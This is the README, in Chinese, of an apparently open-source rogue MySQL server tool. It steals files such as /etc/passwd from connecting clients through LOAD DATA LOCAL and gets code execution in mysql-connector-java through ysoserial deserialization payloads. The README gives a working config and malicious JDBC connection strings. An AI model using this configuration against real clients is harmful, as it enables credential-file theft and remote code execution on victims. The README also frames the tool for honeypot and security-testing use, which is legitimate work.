# Rogue Mysql Server

基于 https://github.com/vitessio/vitess 实现的恶意 mysql 服务器, 支持 go, php, python, java, 原生命令行等多种语言下的多种库的 mysql 客户端.  
远离恼人的兼容性问题, 测试过的客户端见下表  

language | library | pass |
---     | --- | --- | 
go | github.com/go-sql-driver/mysql | ✔️ | 
php | mysqli, pdo | ✔️ | 
python | pymysql | ✔️ | 
java | mysql-connector-java | ✔️ |
native | 10.4.13-MariaDB | ✔️ |

觉得好用可以点右上方的 🌟 支持作者

## 功能

* 可以兼容多种 mysql 客户端
* 可以读取二进制文件
* 自动保存文件
* 作为蜜罐使用时, 可选择开启帐号密码验证
* 读取客户端的 ConnAttr, 可能会包含一些客户端的额外信息
* 对于 jdbc, 可控链接串的情况下可以利用 mysql-connector-java 反序列化漏洞进行 RCE

## 配置文件

示例:
```yaml
host: 0.0.0.0
port: 3306
version_string: "10.4.13-MariaDB-log"

file_list: ["/etc/passwd", "C:/boot.ini"]
save_path: ./loot
always_read: false

auth: true
users:
  - root: root
  - root: password
```

`host`, `port` 对应监听的 IP 和端口. version_string 对应客户端得到的服务端版本信息.  
`auth` 对应是否开启验证, 如果为 `false`, 那么不管输什么密码或者不输入密码都可以登录.  
如果为 `true`, 则需要帐号密码匹配下面的设置的帐号密码中的一条.  
而 `file_list` 对应需要读取的文件, 会按照客户端执行语句的顺序读取列表中的文件, 并保存到 `save_path` 文件夹中.  

如果开启 `always_read`, 那么不管客户端是否标记自己支持 LOAD DATA LOCAL, 都会尝试去读取文件, 否则会根据客户端的标记来决定是否读取, 避免客户端请求不同步.  

## jdbc 利用相关

在版本 >= 8.0.20 中, 此漏洞已经被修复,  
https://github.com/mysql/mysql-connector-j/commit/de7e1af306ffbb8118125a865998f64ee5b35b1b  

与 jdbc 相关的配置如下
```yaml
jdbc_exploit: false
always_exploit: false
ysoserial_command: ["java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections7", 'open -a Calculator']
```
`jdbc_exploit` 代表这个功能开启, 在检测到客户端是 mysql-connector-j 的情况下会自动利用.  
`always_exploit` 代表总是开启利用, 优先级比 `always_read` 高.  
`ysoserial_command` 生成反序列化 payload 的命令.  

```
8.x: jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=password
6.x: jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=password
>=5.1.11: jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=password
```

## Ref

jdbc 反序列化思路参考:  
https://github.com/fnmsd/MySQL_Fake_Server  

mysql 协议相关:  
https://github.com/mysql/mysql-connector-j  
https://github.com/vitessio/vitess  
https://github.com/src-d/go-mysql-server  
http://scz.617.cn:8/network/202001101612.txt  
